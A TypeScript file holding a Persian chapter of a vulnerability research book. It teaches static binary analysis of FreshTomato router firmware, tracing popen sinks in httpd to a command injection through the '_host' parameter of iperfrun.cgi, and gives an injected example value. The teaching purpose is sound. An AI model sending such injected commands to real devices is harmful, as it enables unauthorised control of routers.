import { Chapter } from "@/types/reader";

export const CHAPTER_5_FA: Chapter = {
  id: "ch-5",
  title: "فصل ۵: کشف منبع و چاهک در باینری (Source and Sink Discovery)",
  readingTimeMinutes: 38,
  content: `# بخش دوم: مهندسی معکوس (Reverse Engineering)
## ۵: کشف منبع و چاهک در باینری (SOURCE AND SINK DISCOVERY)

> *«زیرا همه‌چیز چون اقیانوسی است، همه‌چیز جاری و متصل است؛ در نقطه‌ای آن را لمس کنی، در آن سوی جهان پژواک می‌یابد.»*  
> — فیودور داستایفسکی (Fyodor Dostoevsky)، *برادران کارامازوف*

با وجود محبوبیت چشمگیر فریم‌ورک‌های مبتنی بر اسکریپت نظیر Electron، واقعیت حاکم بر دنیای امنیت این است که بخش عمده‌ای از باینری‌هایی که در میدان نبرد با آن‌ها روبرو می‌شوید، بنا به دلایل عملی، پرفورمنس و تاریخی، مستقیماً به **کد ماشین (Machine Code)** کامپایل شده‌اند. حتی با مجهزترین و پیشرفته‌ترین ژنراتورهای شبه‌کد (Pseudocode Generators)، تحلیل باینری‌های پیچیده فرآیندی سخت و نفس‌گیر است. برای همه پژوهشگران — مگر زبده‌ترین و کارکشته‌ترین مهندسان معکوس — دست‌وپنجه نرم کردن با صدها تابع ناشناخته، مبهم و بی‌نام‌ونشان به امید یافتن یک آسیب‌پذیری امنیتی، کاری توان‌فرسا و فرسایشی است.

در چنین شرایط دشواری، **اولویت‌بندی استراتژیک (Prioritization)** رمز بقا و کلید موفقیت است. در این فصل، شما تاکتیک‌های **تحلیل ایستا (Static Analysis)** و **تحلیل پویا (Dynamic Analysis)** را برای شناسایی منابع (Sources) و چاهک‌ها (Sinks) در باینری‌های کامپایل‌شده به کد ماشین به کار خواهید بست. همچنین فرا خواهید گرفت که چگونه مسیرهای میان منبع‌ها و چاهک‌ها را با راندمان بالا ردگیری کرده تا آسیب‌پذیری‌های امنیتی واقعی را در سفت‌افزار روتر **FreshTomato** و کتابخانه مشهور پردازش تصویر **ImageMagick** بازکشف (Rediscover) کنید. اگرچه این پروژه‌ها متن‌باز هستند، شما از **دیدگاه جعبه سیاه (Black-Box)** به این اهداف نزدیک خواهید شد و سپس یافته‌های مهندسی معکوس خود را با سورس‌کد اصلی برنامه مقایسه خواهید کرد. در امتداد این مسیر، اکسپلویت‌پذیری (Exploitability) مسیرهای کشف‌شده میان منبع و چاهک را به دقت محک خواهید زد تا اصالت آن‌ها به عنوان آسیب‌پذیری‌های امنیتی واقعی تایید گردد.

---

### تحلیل ایستا (Static Analysis)

تحلیل ایستا به معنای کالبدشکافی و واکاوی نرم‌افزار بدون اجرای مستقیم آن است و معمولاً نقطه آغازین هر پروژه مهندسی معکوس به شمار می‌رود. یک شوخی بسیار رایج و معروف میان مهندسان معکوس وجود دارد که می‌گوید: *«۹۰ درصد کار مهندسی معکوس، کوبیدن متوالی روی کلید X در نرم‌افزار IDA Pro است!»*؛ کلیدی میانبر که لیست تمامی ارجاعات متقابل (Cross-References یا Xrefs) به یک تابع یا متغیر خاص را در سراسر برنامه احضار می‌کند. این شوخی در حقیقت بازتابی از یک تاکتیک فوق‌العاده کاربردی برای ردیابی چاهک به منبع (Sink-to-Source Tracing) است؛ با این تفاوت بنیادین که به جای کار بر روی خطوط سورس‌کد (همانند آنچه در فصل ۱ انجام دادیم)، این بار در محیط یک دیس‌اسمبلر (Disassembler) یا دیکامپایلر (Decompiler) دست به کار می‌شوید. فارغ از شوخی، این رویکرد در مواجهه با نرم‌افزارهایی که لایه‌های امنیتی سفت‌وسختی برای محافظت از خود ندارند، به شکل شگفت‌انگیزی پرثمر و نتیجه‌بخش است.

شما می‌توانید این متدولوژی را روی **FreshTomato** بیازمایید؛ یک سفت‌افزار (Firmware) متن‌باز محبوب برای روترهای مجهز به چیپست Broadcom. برخلاف باینری‌هایی که در فصل پیش بررسی کردید، این سفت‌افزار برای معماری‌های سخت‌افزاری **ARM** و **MIPS** کامپایل شده است؛ معماری‌هایی با مجموعه دستورالعمل‌های کاملاً متفاوت نسبت به پردازنده‌های x86 و x86-64 که عموماً در رایانه‌های رومیزی و سرورها به کار می‌روند. برخورد با این معماری‌های کم‌مصرف در باینری‌های سفت‌افزار امری بسیار معمول است، زیرا دستگاه‌های تعبیه‌شده (Embedded Devices) و اینترنت اشیاء همواره نیازمند بهره‌وری بالاتر در مصرف انرژی هستند.

---

### اکسترکت سفت‌افزار با Binwalk و ابزار Sasquatch

برای آغاز، نگارش 2022.5 سفت‌افزار FreshTomato برای روتر مدل AC1450 را از منبع رسمی آن دانلود می‌کنیم:
\`https://freshtomato.org/downloads/freshtomato-arm/2022/2022.5/K26ARM/freshtomato-AC1450-ARM_NG-2022.5-AIO-64K.zip\`

پس از گشودن فایل فشرده ZIP، سه فایل به دست می‌آید: فایل تاریخچه تغییرات (changelog)، فایل راهنما (README) و در نهایت فایلی با پسوند **\`.trx\`** (فرمت استاندارد و شناخته‌شده ایمیج‌های سفت‌افزار برای دستگاه‌های شرکت Broadcom).

برای آنپک کردن فایل \`.trx\`، از ابزار بی‌نظیر **Binwalk** استفاده می‌کنیم؛ ابزاری پیشرو در اسکن هدرها و امضاهای جادویی برای اکسترکت فایل‌سیستم‌ها از درون ایمیج‌های سفت‌افزار. با توجه به نیازمندی‌های گسترده این ابزار، بهره‌گیری از نسخه پیش‌فرض موجود در توزیع Kali Linux کار را آسان‌تر می‌کند. شایان توجه است که برای استخراج کامل، به ابزار **Sasquatch** نیز نیاز خواهید داشت؛ ابزاری تخصصی برای مدیریت و استخراج انواع مختلف قالب‌های سیستم‌فایل فشرده **SquashFS** که باین‌واک به شدت به آن متکی است. به دلیل وجود پاره‌ای ناسازگاری‌ها در فرآیند کامپایل ساسکواچ روی توزیع‌های مدرن کالی، پژوهشگر امنیت پاول پی (Pavel Pi) راه‌حلی مستند را ارائه داده که در قالب دستورات زیر پیاده‌سازی شده است:

\`\`\`bash
$ sudo apt-get update
$ sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev
$ git clone https://github.com/devttys0/sasquatch && cd sasquatch
$ ADDLINE="sed -i 's/-Wall -Werror/-Wall/g' patches/patch0.txt"
$ sed -i "/^tar -zxvf.*/a $ADDLINE" ./build.sh
$ CFLAGS=-fcommon ./build.sh
\`\`\`

پس از کامپایل و نصب موفقیت‌آمیز Sasquatch، سفت‌افزار را آنپک می‌کنیم. با بهره‌گیری از سوییچ‌های استخراج (\`-e\`) و اجرای بازگشتی (\`-M\`)، باین‌واک تارگت را رمزگشایی و متلاشی می‌کند:

\`\`\`bash
$ unzip freshtomato-AC1450-ARM_NG-2022.5-AIO-64K.zip
$ binwalk -eM freshtomato-AC1450-ARM_NG-2022.5-AIO-64K.trx
$ ls -l _freshtomato-AC1450-ARM_NG-2022.5-AIO-64K.trx.extracted/squashfs-root
total 80
drwxr-xr-x 2 kali kali  4096 Aug  4  2022 bin
drwxr-xr-x 2 kali kali  4096 Aug  4  2022 bkp
drwxr-xr-x 2 kali kali  4096 Aug  4  2022 cifs1
drwxr-xr-x 2 kali kali  4096 Aug  4  2022 cifs2
drwxr-xr-x 2 kali kali  4096 Aug  4  2022 dev
lrwxrwxrwx 1 kali kali     7 Aug  4  2022 etc -> tmp/etc
lrwxrwxrwx 1 kali kali     8 Aug  4  2022 home -> tmp/home
drwxr-xr-x 2 kali kali  4096 Aug  4  2022 jffs
drwxr-xr-x 3 kali kali  4096 Aug  4  2022 lib
drwxr-xr-x 2 kali kali  4096 Aug  4  2022 mmc
lrwxrwxrwx 1 kali kali     7 Aug  4  2022 mnt -> tmp/mnt
drwxr-xr-x 2 kali kali  4096 Aug  4  2022 nas
drwxr-xr-x 2 kali kali  4096 Aug  4  2022 opt
drwxr-xr-x 2 kali kali  4096 Aug  4  2022 proc
drwxr-xr-x 3 kali kali  4096 Aug  4  2022 rom
lrwxrwxrwx 1 kali kali    13 Aug  4  2022 root -> tmp/home/root
drwxr-xr-x 2 kali kali  4096 Aug  4  2022 sbin
drwxr-xr-x 2 kali kali  4096 Aug  4  2022 sys
drwxrwxrwx 2 kali kali  4096 Aug  4  2022 tftpboot
drwxr-xr-x 2 kali kali  4096 Aug  4  2022 tmp
drwxr-xr-x 8 kali kali  4096 Aug  4  2022 usr
lrwxrwxrwx 1 kali kali     7 Aug  4  2022 var -> tmp/var
drwxr-xr-x 3 kali kali 12288 Jun  6 10:23 www
\`\`\`

پوشه استخراج‌شده **\`squashfs-root\`** در بردارنده تمامی فایل‌سیستم لینوکسی است که در زمان بوت بر روی حافظه فلش روتر بارگذاری می‌گردد. به هنگام ترسیم **سطح حمله (Attack Surface)** یک روتر یا دستگاه اینترنت اشیاء، یکی از نخستین نقاطی که باید بلافاصله وارسی کنید، دایرکتوری‌های **\`/www\`** یا **\`/var/www\`** هستند؛ زیرا این مسیرها معمولاً جایگاه اسکریپت‌ها و باینری‌هایی هستند که مدیریت پنل تحت وب روتر را بر عهده دارند.

اما در این پرونده، بررسی دقیق دایرکتوری \`www\` آشکار می‌سازد که تنها فایل‌های فرانت‌اند با پسوندهای \`.asp\`، \`.js\` و \`.css\` در آن جای گرفته‌اند؛ فایل‌هایی که صرفاً عهده‌دار رندر کردن رابط کاربری در مرورگر هستند و هیچ اثری از منطق تجاری (Business Logic) سمت سرور در آن‌ها به چشم نمی‌خورد. در این سناریو، باید به دنبال باینری اجرایی وب‌سرور بگردید که معمولاً تحت عنوان **\`httpd\`** (کوتاه‌شده Hypertext Transfer Protocol daemon) نام‌گذاری می‌شود.

برخلاف وب‌سرورهای ماژولار و گسترده نظیر Apache (که از نام پردازه httpd استفاده می‌کند) یا Nginx، باینری httpd در روترها و دستگاه‌های توکار ساختاری **یکپارچه، خودکفا و ایزوله (Self-Contained)** دارد؛ به این معنا که تمامی مسیرهای روتینگ، هندلرهای درخواست و منطق تجاری مستقیماً در کالبد همان یک باینری کدنویسی و هاردکد شده‌اند. این طراحی به دلیل محدودیت شدید در فضای ذخیره‌سازی و توان پردازشی محدود روترها اتخاذ می‌شود. جستجویی سریع، وجود این باینری کلیدی را در مسیر \`usr/sbin/httpd\` تایید می‌کند.

---

### استخراج رشته‌های متنی (Dumping Strings)

پیش از آنکه باینری را به درون یک دیس‌اسمبلر سنگین بیندازید، باید رشته‌های اسکی و متنی قابل‌چاپ درون آن را محک بزنید. برای این منظور، از یک ترفند فوق‌العاده ساده اما به طرز بهت‌آوری اثربخش بهره می‌گیریم: دستور **\`strings\`**. گزیده‌ای از خروجی این ابزار در فهرست ۵-۱ به نمایش درآمده است:

\`\`\`bash
$ strings ./squashfs-root/usr/sbin/httpd
--snip--
fgets
get_wanfaces
❶ system
--snip--
❷ Content-Type: %s
Cache-Control: max-age=%d
Cache-Control: no-cache, no-store, must-revalidate, private
Expires: Thu, 31 Dec 1970 00:00:00 GMT
Pragma: no-cache
Connection: close
<html><head><title>Error</title></head><body><h2>%d %s</h2> %s</body></html>
--snip--
❸ grep -ih "%s" $(ls -1rv %s %s.*)
which
cat $(ls -1rv %s %s.*) | tail -n %d
--snip--
❹ cfg/restore.cgi
cfg/defaults.cgi
stats/*.gz
\`\`\`

*فهرست ۵-۱: گزیده‌ای از رشته‌های متنی کشف‌شده در باینری httpd*

این خروجی به وضوح اثبات می‌کند که باینری مزبور وب‌سرور اصلی پنل مدیریتی است و سرنخ‌هایی درخشان از میوه‌های دم‌دستی (Low-Hanging Fruit) را هویدا می‌سازد:
۱. نام توابع حساس و خطرناک منبع و چاهک نظیر **\`system\`** ❶ که دستورات شل را مستقیماً اجرا می‌کند، در کنار رشته‌های فرمت استاندارد پاسخ‌های وب ❷.
۲. استفاده از رشته‌های فرمت در ساخت دستورات خط فرمان یونیکس ❸ که زنگ خطری جدی مبنی بر احتمال کنترل‌پذیر بودن پارامترها توسط ورودی کاربر است.
۳. مسیرها و روت‌های حساس قابل دسترس در وب‌سرور نظیر \`cfg/restore.cgi\` ❹.

تنها با یک جستجوی بدوی، چندین محدوده طلایی برای تمرکز تحقیقات تعیین گردید. اکنون نوبت گشودن جعبه‌ابزار دیس‌اسمبلر است.

---

### دیس‌اسمبل و دیکامپایل با Ghidra

در فصل ۴ با محیط Ghidra CodeBrowser آشنا شدید. اکنون زمان آن است که از قابلیت‌های تحلیلی عمیق‌تر آن بهره‌برداری کنیم. CodeBrowser بایت‌های خام باینری را دیس‌اسمبل کرده، آن‌ها را به کدهای اسمبلی خوانا بدل می‌سازد و سپس با موتور تحلیلی خود، آن‌ها را به شبه‌کدهای سطح بالای C دیکامپایل می‌کند.

در نرم‌افزار گیدرا، پروژه‌ای جدید ایجاد کرده و فایل باینری \`httpd\` را اضافه نمایید. با باز کردن آن در CodeBrowser، آنالایزر به صورت پیش‌فرض روی نقطه ورود (Entry Point) توقف می‌کند. برای باینری‌های کوچک، آغاز کار از نقطه ورود میسر است؛ اما برای باینری‌های پرپیچ‌وخم، اتخاذ استراتژی **تحلیل معکوس از چاهک به منبع (Sink-to-Source)** بی‌نهایت کارآمدتر است؛ رویکردی که با مکان‌یابی فراخوانی‌های توابع کتابخانه‌ای خطرناک کلید می‌خورد.

در سمت چپ رابط کاربری گیدرا، پنل **Symbol Tree** واقع شده است. این درخت تمامی نمادهای شناخته‌شده را گروه‌بندی می‌کند. پوشه Functions صرفاً در بردارنده توابع داخلی تعریف‌شده در بدنه خود برنامه است. در عوض، باید به سراغ پوشه **Imports** بروید که کدهای کتابخانه‌های اشتراکی خارجی را میزبانی می‌کند. با باز کردن آن، نام کتابخانه‌هایی نظیر \`libc.so.0\`، \`libmssl.so\` و دایرکتوری مجازی **\`<EXTERNAL>\`** نمایان می‌شود. پوشه \`<EXTERNAL>\` انتزاعی اختصاصی در گیدرا است تا نمادهای خارجی که هنوز به کتابخانه معینی پیوند نخورده‌اند را در خود جای دهد.

اما نکته‌ای عجیب خودنمایی می‌کند: وقتی پوشه‌های کتابخانه‌های اشتراکی را باز می‌کنید، هیچ تابعی در آن‌ها نیست! تمامی نمادها (حتی توابع پایه کتابخانه C نظیر \`getpid\`) درون پوشه \`<EXTERNAL>\` انباشته شده‌اند. چه اتفاقی رخ داده است؟

بیایید جدول نمادهای باینری را با \`objdump\` برون‌ریزی کنیم:

\`\`\`bash
$ objdump -t httpd
httpd: file format elf32-little
SYMBOL TABLE:
no symbols
\`\`\`

هیچ رکوردی در جدول نمادها وجود ندارد! این امر گویای آن است که باینری **استریپ (Stripped)** شده است؛ واقعیتی که با دستور \`file\` به سادگی تایید می‌شود:

\`\`\`bash
$ file usr/sbin/httpd
usr/sbin/httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV),
dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
\`\`\`

باینری هم به صورت پویا پیوند خورده (Dynamically Linked) و هم استریپ شده است. این سناریویی بسیار شایع در سفت‌افزار دستگاه‌های تعبیه‌شده است، چرا که حذف جداول نمادها حجم باینری را به حداقل می‌رساند. در چنین حالتی، به جای جدول نمادهای معمولی، باید **جدول نمادهای پویا (Dynamic Symbol Table)** را استخراج کنیم:

\`\`\`bash
$ objdump -T httpd
httpd: file format elf32-little
DYNAMIC SYMBOL TABLE:
0000a504 DF *UND*  00000000 get_wan6face
0000a510 DF *UND*  00000000 rewind
0000a51c DF *UND*  00000000 bind
00000000  wD *UND*  00000000 __register_frame_info
0000a534 DF *UND*  00000000 getNVRAMVar
0000a540 DF *UND*  00000000 strftime
0000a54c DF *UND*  00000000 mssl_init
\`\`\`

این جدول سرانجام راز گیدرا را برملا می‌سازد و چرایی قرار گرفتن نمادها در پوشه \`<EXTERNAL>\` را توجیه می‌کند. با پیمایش نمادها، دو چاهک مشکوک و بی‌نهایت خطرناک جلوه‌گری می‌کنند: **\`system\`** و **\`popen\`**. هر دوی این توابع نخستین آرگومان خود را به عنوان یک فرمان شل در پردازه‌ای تازه به اجرا می‌گذارند؛ رفتاری کاملاً هم‌ارز با ارسال دستور به \`/bin/sh\` به همراه پرچم \`-c\`.

با توجه به ماهیت وظایف مدیریتی در پنل وب روترها، استفاده مکرر از این توابع سیستمی دور از انتظار نیست. در حقیقت، اگر تمام تمرکز پژوهشی خود را در سفت‌افزارهای مختلف تنها بر روی چاهک‌های \`popen\` و \`system\` متمرکز کنید، با احتمال بالایی به چندین آسیب‌پذیری تزریق فرمان (Command Injection) دست خواهید یافت.

اگرچه اصطلاح «علامت‌گذاری با X» به کلید میانبر X در IDA Pro بازمی‌گردد، اما میانبر معادل برای مشاهده ارجاعات متقابل در نرم‌افزار گیدرا، کلیدهای ترکیبی **CTRL-SHIFT-F** است. با این حال، اگر این کلیدها را روی نماد \`popen\` در پنل Symbol Tree بفشارید، گیدرا تنها یک ارجاع به خود تابع را برمی‌گرداند! به خاطر بیاورید که نمادهای پیوند خورده به صورت پویا، در دیکامپایلر به عنوان **توابع سانک (Thunk Functions)** مصنوعی مدلسازی می‌شوند که بارگذاری توابع در زمان اجرا را نمایندگی می‌کنند. در گیدرا این اعلان به شکل زیر است:

\`\`\`c
thunk FILE * popen(char * __command, char * __modes)
Thunked-Function: <EXTERNAL>::popen
FILE * r0:4 <RETURN>
char * r0:4 __command
char * r1:4 __modes
<EXTERNAL>::popen
\`\`\`

بنابراین، باید نماد واقعی **\`<EXTERNAL>::popen\`** را برگزینید و میانبر (یا راست‌کلیک و انتخاب گزینه References ▶ Show References to popen) را اجرا نمایید تا تمامی فراخوانی‌های واقعی به \`popen\` در سراسر کالبد باینری فهرست شوند:

\`\`\`text
0000e970 bl <EXTERNAL>::popen UNCONDITIONAL_CALL
0000f098 bl <EXTERNAL>::popen UNCONDITIONAL_CALL
0000f118 bl <EXTERNAL>::popen UNCONDITIONAL_CALL
00011748 bl <EXTERNAL>::popen UNCONDITIONAL_CALL
00013d64 bl <EXTERNAL>::popen UNCONDITIONAL_CALL
0001ad1c bl <EXTERNAL>::popen UNCONDITIONAL_CALL
\`\`\`

شش فراخوانی صریح و بی واسطه به تابع خطرناک \`popen\`! اکنون که چاهک‌ها به دام افتاده‌اند، مأموریت اصلی یعنی ردیابی آن‌ها به سمت منبع‌های کنترل‌پذیر توسط مهاجم آغاز می‌شود.

---

### ردیابی چاهک به منبع (Sink-to-Source Tracing) در httpd

مهندسی معکوس باینری‌های استریپ‌شده مستلزم حدس‌های آگاهانه و استنتاج‌های مبتنی بر شواهد متنی (نظیر رشته‌های متنی لاگ‌ها) است. برای آغاز، ماهیت کارکرد برنامه را در ذهن مرور کنید: این برنامه یک وب‌سرور است که درخواست‌ها و پاسخ‌های HTTP را پردازش می‌کند. از این رو، توابعی که درخواست‌ها را مدیریت می‌کنند، ناگزیرند رشته‌های مربوط به پروتکل HTTP را پارس نمایند:
- افعال پروتکل HTTP نظیر GET, POST, PUT, DELETE.
- پارامترهای درخواست که متناظر با فیلدهای فرم‌های HTML یا اسکریپت‌های کلاینت هستند.
- انواع محتوا (Content-Type) نظیر \`text/plain\`، \`application/json\` و \`application/x-www-form-urlencoded\`.
- مسیرهای URI که به روت‌های معتبر سرور اشاره دارند.
- هدرهای رایج نظیر Authorization, Host, User-Agent.

با بررسی ۶ ارجاع کشف‌شده به \`popen\`، آخرین فراخوانی در آدرس آفست \`0x0001ad1c\` در تابعی به نام **\`FUN_0001abc0\`** جلب توجه می‌کند؛ تابعی که طبق فهرست ۵-۲ به نظر می‌رسد مستقیماً در حال استخراج پارامترهای درخواست است:

\`\`\`c
void FUN_0001abc0(void)
{
  // --snip--
  pcVar1 = (char *)FUN_0000cfdc("_port");
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "5201";
  }
  iVar2 = atoi(pcVar1);
  pcVar1 = (char *)FUN_0000cfdc("_udpProto");
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "0";
  }
  puVar3 = (undefined *)atoi(pcVar1);
  pcVar1 = (char *)FUN_0000cfdc("_limitMode");
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "0";
  }
  iVar4 = atoi(pcVar1);
  pcVar1 = (char *)FUN_0000cfdc("_limit");
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "10";
  }
  uVar8 = strtoull(pcVar1,(char **)0x0,0);
  pcVar1 = (char *)FUN_0000cfdc("_mode");
  if ((pcVar1 != (char *)0x0) && (*pcVar1 != '\\0')) {
  // --snip--
\`\`\`

*فهرست ۵-۲: شبه‌کد دیکامپایل‌شده تابع FUN_0001abc0*

رشته‌های \`_port\`، \`_udpProto\`، \`_limitMode\` و \`_limit\` بدون شک پارامترهای یک درخواست هستند. همه آن‌ها از الگویی یکپارچه پیروی می‌کنند: به عنوان آرگومان به تابع کمکی **\`FUN_0000cfdc\`** ارسال می‌شوند و در صورت خالی بودن، مقداری پیش‌فرض دریافت می‌کنند. بیایید نگاهی به شبه‌کد تابع \`FUN_0000cfdc\` بیندازیم:

\`\`\`c
int FUN_0000cfdc(ACTION param_1,undefined4 param_2)
{
  ENTRY __item;
  ENTRY **unaff_r4;
  int unaff_r5;
  
  if (DAT_00030c8c == 0) {
    unaff_r5 = 0;
  }
  else {
    __item.data = (void *)param_2;
    __item.key = (char *)&DAT_00030c8c;
❶   hsearch_r(__item,param_1,unaff_r4,(hsearch_data *)0x0);
    if (unaff_r5 != 0) {
      unaff_r5 = *(int *)(unaff_r5 + 4);
    }
  }
  return unaff_r5;
}
\`\`\`

این تابع مستقیماً تابع کتابخانه‌ای **\`hsearch_r\`** ❶ را صدا می‌زند؛ تابعی در کتابخانه استاندارد C که جستجو در جدول هش (Hash Table) را انجام می‌دهد. این رفتار کاملاً با منطق استخراج مقدار یک پارامتر بر اساس کلید ارسالی مطابقت دارد. در صورتی که این باینری را در IDA Pro باز می‌کردید، امضاهای نرم‌افزاری آن را خودکار به عنوان **\`WebsGetVar\`** شناسایی می‌کردند؛ تابعی استاندارد در وب‌سرورهای امبدد برای خواندن پارامترهای درخواست HTTP GET/POST.

حال چگونه بفهمیم این پارامترها به کدام بخش از وب‌سرور تعلق دارند؟ کافی است فایل‌های متنی سفت‌افزار را برای یافتن یکی از این پارامترها جستجو کنیم. برای پرهیز از موارد مثبت کاذب ناشی از کلمات عام مانند \`_port\`، رشته خاص‌تر **\`_limitMode\`** را جستجو می‌کنیم:

\`\`\`bash
$ grep -r "_limitMode" .
grep: ./usr/sbin/httpd: binary file matches
./www/tools-iperf.asp:+ '&_limitMode=' + (limitMode ? '1' : '0')
\`\`\`

نتیجه فوق‌العاده است! رشته \`_limitMode\` در فایلی به نام **\`tools-iperf.asp\`** پیدا شد؛ یک سند Active Server Pages (ASP) که برای رندر پویای صفحات وب به کار می‌رود. حضور این رشته در یک فایل فرانت‌اند، سند قاطعی است مبنی بر اینکه با پارامترهای یک ویژگی واقعی در وب‌اینترفیس روتر (ابزار تست پهنای باند iperf) روبرو هستیم.

---

### تحلیل فرانت‌اند و برقراری پیوند نهایی

با گشودن فایل \`tools-iperf.asp\`، به تابع جاوااسکریپت \`runButtonClick\` می‌رسیم:

\`\`\`javascript
function runButtonClick() {
❶ var requestCommand = new XmlHttp();
  requestCommand.onCompleted = function(text, xml) {}
  requestCommand.onError = function(x) {
    E('test_status').innerHTML = 'ERROR: ' + x;
    execute();
  }
  if (iperf_up == 1) {
    requestCommand.post('iperfkill.cgi', '');
  } else {
    var transmitMode = E('iperf_transm').checked == true;
    var limitMode = E('iperf_size_limited').checked == true;
    var limit = E(limitMode ? 'byte_limit' : 'time_limit').value;
    var udpProtocol = E('iperf_proto_udp').checked == true;
    var ttcpPort = E('iperf_port').value;
    var paramStr = '_mode=' + (transmitMode ? 'client' : 'server') +
      '&_udpProto=' + (udpProtocol ? '1' : '0') +
      '&_port=' + ttcpPort +
❷     '&_limitMode=' + (limitMode ? '1' : '0') +
      '&_limit=' + limit;
    if (transmitMode) {
      paramStr += '&_host=' + E('iperf_addr').value;
    }
❸   requestCommand.post('iperfrun.cgi', paramStr);
  }
  E('test_status').innerHTML = '';
  E('test_xfered').innerHTML = '';
  E('test_time').innerHTML = '';
  E('test_speed').innerHTML = '';
}
\`\`\`

تابع فوق یک شیء درخواست HTTP ایجاد می‌کند ❶، پارامترهای استخراج‌شده را در قالب رشته \`paramStr\` به یکدیگر می‌چسباند ❷ و در نهایت آن را با متد POST به آدرس **\`iperfrun.cgi\`** ارسال می‌کند ❸.

این انطباق کامل اثبات می‌کند که تابع \`FUN_0001abc0\` در حقیقت هندلر بک‌اند برای مسیر \`iperfrun.cgi\` است. اما آیا این چاهک واقعاً **اکسپلویت‌پذیر (Exploitable)** است؟

اگر نحوه اعتبارسنجی پارامترهای \`_port\`، \`_udpProto\` و \`_limitMode\` را در بدنه \`FUN_0001abc0\` بازبینی کنید، می‌بینید که مقادیر رشته‌ای بلافاصله توسط توابع استاندارد \`atoi\` و \`strtoull\` به اعداد صحیح تبدیل می‌شوند. این فیلتر عددی شدیداً دست مهاجم را می‌بندد، چرا که کاراکترهای شل در تبدیل به عدد تباه می‌شوند. اما امید خود را از دست ندهید! با استفاده از کلید L در گیدرا نام متغیرهای پارس‌شده را تغییر داده و بخش دوم کد تابع \`FUN_0001abc0\` را نظاره کنید:

\`\`\`c
❶ pcVar1 = (char *)FUN_0000cfdc("_mode");
  if ((pcVar1 != (char *)0x0) && (*pcVar1 != '\\0')) {
    snprintf(acStack_a0,0x80,"%d",_portValue);
❷   iVar2 = strcmp(pcVar1,"server");
    if (iVar2 == 0) {
❸     snprintf(acStack_1a0,0x100,"iperf -J --logfile /tmp/iperf_log --intervalfile \\t\\t\\t/tmp/iperf_interval -I /var/run/iperf.pid -s -1 -D -p %d",_portValue);
    }
    else {
❹     pcVar1 = (char *)FUN_0000cfdc("_host");
      if ((pcVar1 != (char *)0x0) && (*pcVar1 != '\\0')) {
        puVar4 = _udpProtoValue;
        if (_udpProtoValue == (undefined *)0x1) {
          puVar4 = &UNK_000281d1;
        }
        puVar3 = &UNK_000281d4;
        if (_udpProtoValue != (undefined *)0x1) {
          puVar4 = &DAT_0001b232;
        }
        if (_limitModeValue != 1) {
          puVar3 = &UNK_000281d7;
        }
❺       snprintf(acStack_1a0,0x100,"iperf -J --logfile /tmp/iperf_log --intervalfile\\t\\t\\t\\t /tmp/iperf_interval -p %d %s %s %llu -c %s &",_portValue,puVar4,puVar3,_limitValue,pcVar1);
      }
    }
❻   __stream = popen(acStack_1a0,"r");
    pclose(__stream);
  }
\`\`\`

جریان داده را دنبال کنید: ابتدا پارامتر \`_mode\` خوانده شده ❶ و با رشته \`"server"\` مقایسه می‌شود ❷. در صورت تطابق، دستور سرور iperf با فرمت رشته‌ای ❸ آماده شده و به \`popen\` ارسال می‌گردد ❻. همان‌طور که گفتیم، ورودی‌های این شاخه تنها به اعداد صحیح محدودند و راه نفوذی ندارند.

اما اگر شاخه \`else\` فعال شود (یعنی کاربر حالت کلاینت را انتخاب کند)، برنامه پارامتر **\`_host\`** را دریافت می‌کند ❹! به خط ❺ دقت کنید: مقدار \`pcVar1\` (که حاوی رشته خام ارسالی کاربر در پارامتر \`_host\` است) با مشخصه‌گر \`%s\` **بدون هیچ‌گونه پالایش یا اعتبارسنجی** درون بافر دستور شل تزریق شده و مستقیماً به دهان چاهک \`popen\` ریخته می‌شود ❻!

بنابراین، مهاجم با ارسال پارامتر \`_host\` با مقداری نظیر \`;touch /tmp/hacked;\` می‌تواند دستورات دلخواه خود را در روتر اجرا کند!

> **نکته:** در این نسخه از FreshTomato آسیب‌پذیری‌های تزریق فرمان دیگری نیز نهفته است! به عنوان تمرین، تابع \`FUN_00013d58\` را که ارجاعی به \`popen\` دارد بررسی کنید. این تابع یک پوسته محافظ (Wrapper) حول \`popen\` است که در بسیاری از روت‌های دیگر فراخوانی شده است. بررسی کنید که آیا می‌توانید از طریق آن به یک شناسه CVE رسمی برسید یا خیر.

این آزمایش عملی، اقتدار بی‌بدیل تاکتیک «علامت‌گذاری با X» را حتی در سفت‌افزارهای پیچیده به اثبات رساند. پیوند تحلیل ایستای فرانت‌اند و بک‌اند به ما اجازه داد قطعات پازل را بدون در اختیار داشتن سورس‌کد در کنار هم بچینیم.

---

### تحلیل پویا (Dynamic Analysis)

تا به اینجای کار، تنها به تحلیل ایستا متکی بودیم. این شیوه برای باینری‌های کوچک بسیار ایده‌آل است، اما به هنگام مواجهه با فایل‌های اجرایی عظیم به سرعت کارایی خود را از دست می‌دهد. نرم‌افزارهای دسکتاپ سنگین نظیر Microsoft Word صدها کتابخانه را ایمپورت می‌کنند و در بردارنده صدها هزار بلوک دستوری هستند که تحلیل ایستای آن‌ها عملاً غیرممکن است. در این ایستگاه، **تحلیل پویا (Dynamic Analysis)** به عنوان نجات‌بخش وارد میدان می‌شود.

تحلیل پویا بر اجرای واقعی برنامه در حین کار و مشاهده رفتار زمان اجرای آن متمرکز است. مهم‌ترین برتری این رویکرد، زدودن حجم عظیمی از حدس‌ها و تردیدهای مهندسی معکوس است. شما به جای حدس زدن رفتار یک متغیر از روی کدهای مبهم اسمبلی، مقدار زنده و واقعی آن را در حافظه RAM مشاهده می‌کنید و با کمک یک دیباگر، آدرس دقیق دستورالعمل‌های درگیر را بلافاصله شکار می‌نمایید.

بزرگ‌ترین چالش تحلیل پویا این است که پیش از هر چیز، باید **قادر به اجرای تارگت باشید**. اگر کتابخانه‌های خاصی غایب باشند یا معماری پردازنده با سیستم شما همخوانی نداشته باشد، ناچارید به شبیه‌سازها (Emulators) متوسل شوید و توابع کتابخانه‌ای را ماک (Mock) کنید.

